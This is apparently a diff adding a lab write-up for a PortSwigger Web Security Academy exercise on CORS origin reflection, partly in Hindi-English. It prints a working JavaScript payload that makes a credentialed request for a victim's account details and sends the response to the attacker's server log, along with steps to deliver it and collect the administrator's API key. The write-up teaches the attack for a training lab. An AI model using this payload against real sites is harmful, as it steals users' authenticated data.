@@ -1,0 +1,79 @@
+// Lab: CORS vulnerability with basic origin reflection
+
+This website has an insecure CORS configuration in that it trusts all origins.
+
+To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+
+
+// Solution
+
+CORS Misconfiguration: Reflecting Arbitrary Origins
+What's happening, step by step:
+
+1. The Problem Setup
+A server needs to allow multiple domains, so instead of maintaining a strict allowlist, it takes a shortcut, it automatically trusts whatever origin sends the request.
+
+2. Attacker Sends a Request
+A malicious site sends a cross-origin request, including its own origin in the header:
+
+   Origin: https://malicious-website.com
+
+3. Server Blindly Reflects It
+The server reads that Origin header and mirrors it back in the response:
+
+   Access-Control-Allow-Origin: https://malicious-website.com
+   Access-Control-Allow-Credentials: true
+
+4. Credentials Are Included
+Because Allow-Credentials: true is set, the browser also sends the victim's cookies/session tokens with the request.
+
+5. Any Domain Gets Access
+Since the server approves any origin that asks, an attacker can read sensitive responses from the vulnerable domain — authenticated, in-session.
+
+
+Now how to solve:
+
+1. Logged In as given credentials
+
+2. Go to the exploit server and Inject the following payload in the exploit server
+
+<script>
+    const req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get', 'https://0aad009a04b58805802d30fc00780055.web-security-academy.net/accountDetails', true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+
+### Attack Flow (Simple):
+```
+Victim visits attacker's page
+        ↓
+Script runs → GET /accountDetails (victim ke cookies ke saath)
+        ↓
+Server responds with victim's sensitive data
+        ↓
+Data attacker ke server pe /log?key=... se bhej diya jata hai
+```
+
+---
+
+### Yeh kab kaam karta hai?
+
+Tabhi kaam karta hai jab target server ka **CORS misconfigured** ho, matlab server kuch aisa response header bhejta ho:
+```
+Access-Control-Allow-Origin: attacker.com
+Access-Control-Allow-Credentials: true
+
+
+3. Now deliver this exploit to victim and then click on Access logs and grab the API key of administrator.
+
+4. Submit the API key into the submit answer to solve the Lab.
